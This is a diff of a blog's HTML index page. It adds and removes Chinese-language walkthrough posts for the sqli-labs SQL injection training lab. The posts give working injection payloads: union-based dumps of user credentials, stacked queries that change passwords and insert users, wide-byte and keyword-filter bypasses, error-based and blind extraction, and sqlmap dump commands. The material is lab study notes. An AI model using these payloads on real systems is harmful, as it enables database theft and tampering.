@@ -71,6 +71,435 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-28" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/02/15/page-28/" class="article-date">
+  <time class="dt-published" datetime="2021-02-15T11:47:07.000Z" itemprop="datePublished">2021-02-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/02/15/page-28/">sqlilabs 38 39 40 41</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>这几关都是堆叠注入的</p>
+<p>38关是堆叠注入就类似于一条命令里头执行两个操作 </p>
+<p>先来个?id=1  Dumb Dumb （字符型）</p>
+<p>字符型的那么就?id=1’;(和mysql执行完一条指令后一样以；结尾 )update users set password=’(自己设置)’ where username=’Dumb’; –+ </p>
+<p>之后再执行一下？id=1就会发现变成Dumb (自己设置)</p>
+<p>39 也是堆叠注入 这关是数字型 那么就简单点</p>
+<p>?id=1  然后?id=1;insert users values(21,’aaa’,1212’) 直接新增一个用户 </p>
+<p>?id=21 就可以查看到新增加的用户信息</p>
+<p>40闭合方式为?id=1’) </p>
+<p>41没有报错然后和39一样数字型 </p>
+<p>这几关的语句都可以一起用每一关都可以改密码创建新用户 。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/15/page-28/" data-id="ckrosnlua000gmow7he0h22v4" data-title="sqlilabs 38 39 40 41" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-27" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/02/15/page-27/" class="article-date">
+  <time class="dt-published" datetime="2021-02-15T11:23:34.000Z" itemprop="datePublished">2021-02-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/02/15/page-27/">sqlilabs 42 43 44 45</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>42之后这几关是post型的那么burp开启</p>
+<p>admin 111111登录 抓包send to reperter  用堆叠注入修改admin的密码</p>
+<p><img src="https://img-blog.csdnimg.cn/20201011122034362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>这关是单引号 42’)闭合 但是得先登陆成功就是了<img src="https://img-blog.csdnimg.cn/20201011123455185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">用上面那关修改的密码    </p>
+<p>44 和42一样只是关闭了报错 45 和43一样 关闭了报错注入</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/15/page-27/" data-id="ckrosnlu9000fmow7bm5ddxtv" data-title="sqlilabs 42 43 44 45" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-25" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/02/08/page-25/" class="article-date">
+  <time class="dt-published" datetime="2021-02-08T08:28:59.000Z" itemprop="datePublished">2021-02-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/02/08/page-25/">sqlilabs 34 35 37</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>a这关和上面一样只不过get变成post 那就用burp </p>
+<p>先随便输一个username 和password 抓包 改包</p>
+<p>uname=aaa&amp;passwd=aaa&amp;submit=Submit 对这一串进行更改</p>
+<p>uname=aaa%df’ union select 1,database（） –+&amp;passwd=aaa&amp;submit=Submit  还是需要打上%df 就可以了 </p>
+<p>之后还是那套组合拳 </p>
+<p>group_concat(table_name) from information_schema.tables where table_schema=’database()’ –+</p>
+<p>35和34 凑一凑吧 毕竟35真的不多的内容 </p>
+<p>这关就是数字型注入了那么反斜杠的过滤就没用了 直接?id=1 union select 1,2,3 –+ 然后就是标准组合拳</p>
+<p>一套下来 就可以了</p>
+<p>37和34一样 是我弄错什么了？</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/08/page-25/" data-id="ckrosnlu8000emow7a59w9d7x" data-title="sqlilabs 34 35 37" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-24" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/02/08/page-24/" class="article-date">
+  <time class="dt-published" datetime="2021-02-08T05:54:12.000Z" itemprop="datePublished">2021-02-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/02/08/page-24/">sqlilabs 32 33</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>32很神奇 输入单双引号 或者加上括号都会出现<img src="https://img2018.cnblogs.com/blog/1675852/201905/1675852-20190531000842735-239639599.png" alt="img">这么个情况 被加上了个斜杠 被注释掉了</p>
+<p>这归功于php的preg_quote函数的功劳 </p>
+<p>这个需要参数str（输入的字符串）并向其中每个正则表达式的字符前面加个反斜杠 </p>
+<p>代码长这样</p>
+<p>function check_addslashes($string)<br>{<br>    $string = preg_replace(‘/‘. preg_quote(‘\‘) .’/‘, “\\\“, $string);          //escape any backslash<br>    $string = preg_replace(‘/&#39;/i’, ‘\&#39;‘, $string);                               //escape single quote with a backslash<br>    $string = preg_replace(‘/&quot;/‘, “\&quot;“, $string);                                //escape double quote with a backslash</p>
+<pre><code>return $string;
+</code></pre>
+<p>}</p>
+<p>字符集编码设置为gbk可使用宽字节注入 </p>
+<p>尝试%df  反斜杠是%5c 那么就会变成一个整体%df5c  mysql认为前两个字符为汉字 （其实浏览器的字符编码不设置也没差就显示一个乱码而已看着有点怪而已） 然后单引号就可以逃脱出来了 </p>
+<p>?id=0%df’ union select 1,2,3 –+ 测显位</p>
+<p>然后?id=0%df’ union select 1,2,database() –+ </p>
+<p>接下去就是那套组合拳 很容易了</p>
+<p>爆表名字那些的时候table_schema=’security’  这个单引号也滤掉了 但是用%df’ 前头的逃出来了 后头那个没有</p>
+<p>那么就再简单些= database（） </p>
+<p>爆列的时候也可直接还是用 table_schema=database()  </p>
+<p>33和32一样只不过换成了addslashes（）函数 用的语句都是一样的</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/08/page-24/" data-id="ckrosnlu8000dmow70i0naf7e" data-title="sqlilabs 32 33" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-23" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/02/07/page-23/" class="article-date">
+  <time class="dt-published" datetime="2021-02-07T07:58:08.000Z" itemprop="datePublished">2021-02-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/02/07/page-23/">sqlilabs 29 30 31</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>这关拥有很强大的防火墙 </p>
+<p>所以需要使用http参数污染 通<img src="https://img-blog.csdnimg.cn/20201011115133598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>过在http请求中插入特定参数发起攻击  原理差不多是这样</p>
+<p>后端是apache 那么吧参数放在后面 即可 传递两个id 前者合法后者为想要注入的内容</p>
+<p>?id=1&amp;id=-1’ union select 1,2,3 –+ 显位</p>
+<p>?id=1&amp;id=-1’ union select 1,2,database() –+  数据库</p>
+<p>之后就是一顿操作组合拳 就可以了和之前的一样的语句</p>
+<p>30的话双引号就ok了 没别的什么区别了</p>
+<p>31就双引号加括号 就可以了</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/07/page-23/" data-id="ckrosnlu7000cmow79og8bkvr" data-title="sqlilabs 29 30 31" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-21" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/02/06/page-21/" class="article-date">
+  <time class="dt-published" datetime="2021-02-06T07:46:05.000Z" itemprop="datePublished">2021-02-06</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/02/06/page-21/">sqlilabs 27 27a 28 28a</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>a这关过滤了union 和select UNION SELECT Union Select  但是并没有过滤掉所有的可以书写的情况</p>
+<p>所以 unION selEct这样子的还是可以使用的   还过滤了空格 用%0a替代</p>
+<p>或者双写 unionunion selectselect  还有这关采用了    正则表达式负号用不了就只好用0或者666之类的</p>
+<p>?id=0’%0aunION%0aselECT%0a1,2,3||’1’=’1 （||这个可用and或者or替代都行）</p>
+<p>测显示位 loginname 2 password那边显示1</p>
+<p>所以 ?id=0’%0aunION%0aSELECt%0a1,database(),3||’1’=’1 数据库</p>
+<p>?id=0’%0aunION%0aSELECt%0a1,(selECT%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=’security’),3||’1’=’1   爆表名</p>
+<p>?id=0’%0aunION%0aSELECt%0a1,(selECT%0agroup_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_name=’users’),3||’1’=’1  爆users表内的列名</p>
+<p>?id=0’%0aunION%0aSELECt%0a1,(selECT%0agroup_concat(username,’|’,password)%0afrom%0users),3||’1’=’1   获取数据 </p>
+<p>ok 27关结束 </p>
+<p>27a不知道为什么%0a用不了  用）这个替代也可以还有?id=0’ 单引号换双引号</p>
+<p>28就?id=0’) 多个括号 还有没法像27那样有的大写小写绕过 还有就是相连的union select 就双写绕过嘛 unionunion%0aselect%0aselect  还有就是末尾闭合用；%00 </p>
+<p>28a 空格过滤没掉了那就不用%0a了 就和上面的一样的语句 </p>
+<p>井号被过滤可用%23 </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/06/page-21/" data-id="ckrosnlu6000amow7dxtc0684" data-title="sqlilabs 27 27a 28 28a" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-20" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/02/05/page-20/" class="article-date">
+  <time class="dt-published" datetime="2021-02-05T09:12:26.000Z" itemprop="datePublished">2021-02-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/02/05/page-20/">sqlilabs 26</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>z这关神奇的过滤了空格<img src="https://oscimg.oschina.net/oscnet/d2d67dc82bcdbc5788c50fad9e027f1de97.png" alt="img"></p>
+<p>试一试报错注入 </p>
+<p>?id=1’||updatexml(1,concat(‘:’,(select database())),1)||’1’=’1 </p>
+<p>?id=1’||updatexml(1,concat(‘:’,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=’security’))),0)||’1’=’1 (前头有个问号 然后information or双写 空格的位置用）替代 获取所有表名字 )</p>
+<p>?id=1’||updatexml(1,concat(‘:’,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=’users’))),0)||’1’=’1 然后获取列名</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/05/page-20/" data-id="ckrosnlu7000bmow7d5r07r17" data-title="sqlilabs 26" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-19" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/02/01/page-19/" class="article-date">
+  <time class="dt-published" datetime="2021-02-01T08:13:49.000Z" itemprop="datePublished">2021-02-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/02/01/page-19/">sqlilabs 25 25a</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>a 这关过滤了or 和and 如果末尾的闭合要用and‘1’=‘1 就需要吧and双写 anandd </p>
+<p>或者直接用–+也行</p>
+<p>order 的or也会被过滤 那么就写成oorrder </p>
+<p>?id=-1’ oorrder by 3 –+ 测显位</p>
+<p>?id=-1’ union select 1,2,database() –+ 爆数据库</p>
+<p>?id=-1’ union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=’security’ –+这边information的or也要双写 爆表名</p>
+<p>?id=-1’ union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name=’users’ –+  爆字段</p>
+<p>?id=-1’ union select 1,2,group_concat(username,0x7e,passwoorrd) from users –+ 爆数据</p>
+<p>0x7e 是显示~这个符号用的 也可以不打进去</p>
+<p>25a和25差不多就没有了单引号 </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/01/page-19/" data-id="ckrosnlu30006mow7esxhdb33" data-title="sqlilabs 25 25a" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-17" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/02/01/page-17/" class="article-date">
+  <time class="dt-published" datetime="2021-02-01T07:53:05.000Z" itemprop="datePublished">2021-02-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/02/01/page-17/">sqli-labs less 24</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>a这关就<img src="https://img-blog.csdnimg.cn/20200713184411840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkwMTAzOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>给了个这样的界面 从创建新用户那点进去然后新建一个username为admin’# 密码随便 </p>
+<p>记住就行待会</p>
+<p><img src="https://img-blog.csdnimg.cn/20200713184953444.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkwMTAzOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>用admin’#登录 </p>
+<p>然后修改密码 就会发现改的其实是admin的密码 而不是admin’#的 就很神奇</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/01/page-17/" data-id="ckrosnlu50009mow77zpj867k" data-title="sqli-labs less 24" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-16" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/01/31/page-16/" class="article-date">
@@ -116,426 +545,11 @@
 
 
   
-    <article id="post-page-15" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/01/31/page-15/" class="article-date">
-  <time class="dt-published" datetime="2021-01-31T06:43:11.000Z" itemprop="datePublished">2021-01-31</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/01/31/page-15/">sqlilabs 20 21  22 手动注入</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>首先20关过滤了post注入 就只好从cookie入手(用火狐的插件hackbar)</p>
-<p>先登陆一下获取cookie信息 <img src="D:\blog\source_posts\images\image-20210131141955567.png" alt="image-20210131141955567"></p>
-<p>稍微知道一下cookie的格式 然后判断为字符型注入</p>
-<p>uname=aaa’ ordey by 4# 获取位数 数字一个个尝试</p>
-<p><img src="D:\blog\source_posts\images\image-20210131142538658.png" alt="image-20210131142538658"></p>
-<p>到出现这种情况</p>
-<p>然后union语句了</p>
-<p>uname =aaa’ union select 1,2,3 #</p>
-<p>uname=aaa’ union select 1,2,database() # (获取当前使用的数据库名字) 执行后是security</p>
-<p>uname=aaa’ union select 1,2,group_concat(table_name) from informatin_schema.tables where table_schema=‘security’ # (获得所有表名)</p>
-<p>uname=aaa’ union select 1,2,group_concat(columns_name) from information_schema.columns where table_schema=’security’ and table name=’users’ # 获得字段 </p>
-<p>uname=aaa’ union select 1,2,group_concat(username,0x7e,password)from security,users # 获得字段的数据 </p>
-<p>或者用这个语句uname=aaa’ union select 1,2,group_concat(concat_ws(‘-‘,id,username,password)) from users # </p>
-<p>21关稍微变一下用base64 编码一下uname= 之后的内容即可和20一样的 注入符号方式也不一样 构建‘）这样的注入符号   22也是一样就注入符号为” 双引号 然后也是base64 编码一下</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/01/31/page-15/" data-id="ckrosnlu20004mow79a3q6vl7" data-title="sqlilabs 20 21  22 手动注入" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-12" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/01/24/page-12/" class="article-date">
-  <time class="dt-published" datetime="2021-01-24T09:38:47.000Z" itemprop="datePublished">2021-01-24</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/01/24/page-12/">sqlmap注入前十关</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>1-10 sqlmap.py -u “      “ –current-db 或者dbs 获取所有数据库<br>sqlmap.py -u “      “ -D （输入current获取到的）–tables<br>sqlmap.py -u “      “  -D （输入current获取到的）-T （tables获取到的） –columns </p>
-<p>sqlmap.py -u “      “  -D （输入current获取到的）-T （tables获取到的） -C (columns获得的) –dump</p>
-<p>然后第十关提高一下level –level 2 </p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/01/24/page-12/" data-id="ckrosnlu00001mow7ecpi1y60" data-title="sqlmap注入前十关" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-11" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/01/24/page-11/" class="article-date">
-  <time class="dt-published" datetime="2021-01-24T09:35:33.000Z" itemprop="datePublished">2021-01-24</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/01/24/page-11/">page十一关手动注入 十二也可以</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>先判断注入类型 </p>
-<p>用火狐下载个插件hackbar </p>
-<p>然后 post data那边输入 uname=admin（这个后面输入一个符号之类的判断注入类型）#&amp;passwd=admin&amp;submit=Submit （十二关是双引号 就加上“））</p>
-<p>这关的就有提示单引号注入 那么uname=admin’ #&amp;passwd=admin&amp;submit=Submit 输入这段</p>
-<p>登陆成功  然后uname=admin’  order by 2（这个数字可以慢慢试看到多少的时候显示登陆错误）#&amp;passwd=admin&amp;submit=Submit 这个是用来的出显示位数的</p>
-<p>接下来使用联合查询语句 union select 来进行爆破，使用union select的时候要注意，输入的unname必须是一个不存在的，，否则将会输出不出来</p>
-<p>uname=aaa’ union select 1,2#&amp;passwd=admin&amp;submit=Submit 比如这样子</p>
-<p>uname=aaa’ union select user(),version() #&amp;passwd=admin&amp;submit=Submit这句爆出使用者和数据库版本</p>
-<p>之后操作就和第一关是一样的都是那些语句</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/01/24/page-11/" data-id="ckrosnlu10003mow70ohqdm54" data-title="page十一关手动注入 十二也可以" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-9" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/01/22/page-9/" class="article-date">
-  <time class="dt-published" datetime="2021-01-22T12:27:10.000Z" itemprop="datePublished">2021-01-22</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/01/22/page-9/">sqlmap抓包功能</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>a老样子 win+r cmd sqlmap.py -u “想抓哪关的包的地址例如：<a target="_blank" rel="noopener" href="http://localhost/sqli-labs/Less-11/&quot;">http://localhost/sqli-labs/Less-11/&quot;</a> –forms  –thread 10 -dbs  </p>
-<p>这个会出现一句话例如这样Edit POST data [default: uname=&amp;passwd=&amp;submit=Submit] (Warning: blank fields detected):</p>
-<p>按照上面的要求就在后面输入 uname=aaa（随便）&amp;passwd=aaa（随便）&amp;submit=Submit</p>
-<p>也可选择默认方式后面加个–batch</p>
-<p>这速度也挺快的</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/01/22/page-9/" data-id="ckrosnlv1001wmow7d4w802xh" data-title="sqlmap抓包功能" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-8" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/01/20/page-8/" class="article-date">
-  <time class="dt-published" datetime="2021-01-20T06:43:56.000Z" itemprop="datePublished">2021-01-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/01/20/page-8/">page less 11-20</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>a到十一这些都是post型的可用sqlmap 粗暴的方式解题 用火狐打开 然后f12选择网络那个选项里头的有个post那项右键复制请求头</p>
-<p> 然后随便生成一个文本文档粘贴进去 </p>
-<p>再在网页那边随便输入用户名密码 </p>
-<p>再次复制 这次复制post数据像这样子的uname=aaa&amp;passwd&amp;submit=Submit//&amp;这个符号要自己加</p>
-<p>之后win+r cmd sqlmap.py -r “刚才那个文本文档的地址\mingzi.txt” –current-db –batch </p>
-<p>爆出当前数据库 之后sqlmap.py -r “刚才那个文本文档的地址\mingzi.txt” -D 库名 –tables –batch</p>
-<p>库名表明 爆表名字是需要 -C 表明 –dump 加上个dump </p>
-<p>ps 如果觉得速度慢点话加个 –thread 10 有的关如果爆不出来提高level  –level 2-5选一个</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/01/20/page-8/" data-id="ckrosnluw001mmow71jfuc0pd" data-title="page less 11-20" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-5" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/11/25/page-5/" class="article-date">
-  <time class="dt-published" datetime="2020-11-25T12:28:10.000Z" itemprop="datePublished">2020-11-25</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/11/25/page-5/">盲注</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>?id=1’ and length(database())=n %23 n从0到无穷大 猜出数据库长度 </p>
-<p>?id=1’ and left(database(),1)&gt;’<em><strong>a</strong></em>‘–+ 猜数据库首字母 显示you are in 表示该字母还在输入的字母后假设输入一个显示you are in的下一个什么都没显示 则为此 第二第三位一次猜下去（猜库名）</p>
-<ul>
-<li>利用substr() ascii()函数进行尝试</li>
-</ul>
-<p>?id=1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit <strong>0</strong>,1),<em><strong>1</strong></em>,1))&gt;<strong>100</strong>–+  加黑数字更改 此为ascii码对照数字对应字母 也是和猜库名一样的操作  这猜第一个库的第一个字符   然后一个一个改 猜出第n个库的第n个字符</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/25/page-5/" data-id="ckrosnlui000xmow77rg2b6xb" data-title="盲注" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-4" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/11/19/page-4/" class="article-date">
-  <time class="dt-published" datetime="2020-11-19T15:23:35.000Z" itemprop="datePublished">2020-11-19</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/11/19/page-4/">sqli-labs</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>前两关</p>
-<p>输入？id=1和？id=2 和？id=2-1</p>
-<p>若2-1的结果和2一样则为字符型 若2-1 和1的结果一样则为数字型</p>
-<p>然后<em>确认字段位数</em> order by 数字一个个试看哪个报错就可确认其为n-1位</p>
-<p><em>确认占位信息</em>    ？id=-1 union select 1，<em>2，3 –+</em></p>
-<p><em>找库名</em>    ？id=-1 union select 1，2，database（）2之后的便是库名</p>
-<p><em>找表名</em>   ?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+ </p>
-<p><em>找字段名</em>   ?id=-1 union select 1,2,group_concat(column_name) from information_schema.COLUMNs where table_schema=’security’ and table_name=’users’–+</p>
-<p><em>找账号密码</em>  ?id=-1 union select 1,2,group_concat(concat_ws(‘,’,username,password) SEPARATOR ‘|’) from users –+</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/19/page-4/" data-id="ckrosnlue000pmow799320yb4" data-title="sqli-labs" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-3" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/11/19/page-3/" class="article-date">
-  <time class="dt-published" datetime="2020-11-19T15:07:41.000Z" itemprop="datePublished">2020-11-19</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/11/19/page-3/">less 3</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)</p>
-<p>输入单引号，根据报错信息确定咱们输入的内容存放到一对单引号加圆括号中了，猜想一下咱们输入1在数据库语句中的位置，形如select … from … where id=(‘1’) …，在第一题中id=1‘的后面单引号加上），其它保持不变就行了</p>
-<p>Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）</p>
-<p>输入单引号页面无变化 双引号页面报错 据报错信息判断出咱们输入的内容被放到一队双引号和圆括号中， 猜想一下：select … from … where id=(”1”) …，把第一题中1后面的引号换成双引号加）就可以了</p>
-
-      
-    </div>
-    <footer class="article-footer">
